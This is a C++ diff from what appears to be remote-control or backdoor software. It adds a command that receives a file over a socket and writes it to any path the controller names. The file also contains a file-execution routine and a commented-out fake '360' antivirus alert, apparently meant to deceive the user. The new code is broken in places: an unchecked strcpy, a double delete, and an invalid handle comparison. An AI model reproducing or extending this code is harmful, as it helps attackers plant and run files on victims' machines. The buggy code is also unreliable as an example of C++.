@@ -84,9 +84,14 @@ DWORD MainFileManage()
 				FileExec(chBuffer, &msgHead);
 			}
 			break;
+		case CMD_FILE_TO_CLIENT:
+			{
+				recvClientFile(chBuffer, &msgHead, FileSocket);
+			}
+			break;
 		default:
 			{
-
+				//::MessageBox(NULL,"您的360出现问题！", "您的360出现问题！", MB_OK);
 			} 
 			break;
 
@@ -321,6 +326,36 @@ void FileExec(char *pBuf, LPMsgHead lpMsgHead)
 		CloseHandle(ProcessInfo.hThread);
 		CloseHandle(ProcessInfo.hProcess);
 	}
+}
+
+
+
+void recvClientFile(char *pBuf, LPMsgHead lpMsgHead, SOCKET FileSocket)
+{
+	char* localPath = new char[266];
+	strcpy(localPath, pBuf);
+	CFile file;
+	int err = 0;
+	CFileException fileException;
+	try
+	{
+		file.Open(localPath, CFile::modeCreate | CFile::modeRead | CFile::modeReadWrite, &fileException);
+		err = GetLastError();
+	}
+	catch (CFileException* e)
+	{
+		file.Close();
+		delete localPath;
+	}	
+	delete localPath;
+	if(file == INVALID_HANDLE_VALUE || err == 5) {
+		return ;
+	}
+	while(RecvMsg(FileSocket, pBuf, lpMsgHead)){
+		file.Write(pBuf, lpMsgHead->dwSize);
+		if(lpMsgHead->dwSize < MAX_FILE_DATA_BUFFER_SIZE) break;
+	}
+	file.Close();
 }
 
 /*
